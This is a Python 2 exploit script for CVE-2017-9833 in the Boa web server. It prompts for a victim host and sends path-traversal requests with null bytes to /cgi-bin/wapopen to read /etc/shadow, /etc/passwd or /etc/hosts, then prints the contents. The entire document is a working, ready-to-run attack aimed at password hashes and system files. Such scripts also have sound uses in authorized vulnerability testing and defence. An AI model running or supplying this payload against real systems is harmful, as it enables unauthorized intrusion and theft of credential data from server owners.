import requests
import string
import random
from urlparse import urlparse

print "---------------------------------------------------------------------"
print "BOA Web Server 0.94.14 - Access to arbitrary files as privileges\nDiscovery: Miguel Mendez\nExploit Author: Munir Njiru\nWebsite: https://www.alien-within.com\nCVE-2017-9833\nVulnerable Version: Boa Webserver 0.94.14rc21"
print "---------------------------------------------------------------------"
victim = raw_input("Please Enter victim host e.g. http://example.com:80\n")
file_choice=raw_input ("Please choose a number representing the file to attack: \n1. Linux Shadow File \n2. Linux Passwd File\n3. Linux Hosts File\n")
if file_choice == "1":
    payload="/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/shadow%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=malice&PWD=malice&PIC_SIZE=0"
elif file_choice == "2":
    payload="/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/passwd%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=malice&PWD=malice&PIC_SIZE=0"
elif file_choice == "3":
    payload="/cgi-bin/wapopen?B1=OK&NO=CAM_16&REFRESH_TIME=Auto_00&FILECAMERA=../../etc/hosts%00&REFRESH_HTML=auto.htm&ONLOAD_HTML=onload.htm&STREAMING_HTML=streaming.htm&NAME=malice&PWD=malice&PIC_SIZE=0"
else:
    print "Invalid Download choice, Please choose 1 ,2 or 3; Alternatively you can re-code me; I will now exit"
    quit()  
target=victim+payload
	
def checkReachable():
    PortalIsAlive = requests.get(target+"/cgi-bin/wapopen")
    PortalIsExistent = PortalIsAlive.status_code
    if PortalIsExistent == 200:
        print "\nI can reach the target , I will attempt the exploit\nRunning exploit..."
        exploit()
    else:
        print "Target has a funny code & might not be vulnerable, I will now exit\n"
        quit()
     
def exploit():
    WhyLiveWithLFI = requests.get(target)
    fileState = WhyLiveWithLFI.status_code
    if fileState == 200:
		respFromThatFile = WhyLiveWithLFI.text
		print respFromThatFile
    else: 
	print "I am not saying it was me but it was me! Something went wrong when I tried to get the file. The server responded with: \n" +str(fileState)+"\n"+str(WhyLiveWithLFI.text)
  
if __name__ == "__main__":
    checkReachable()
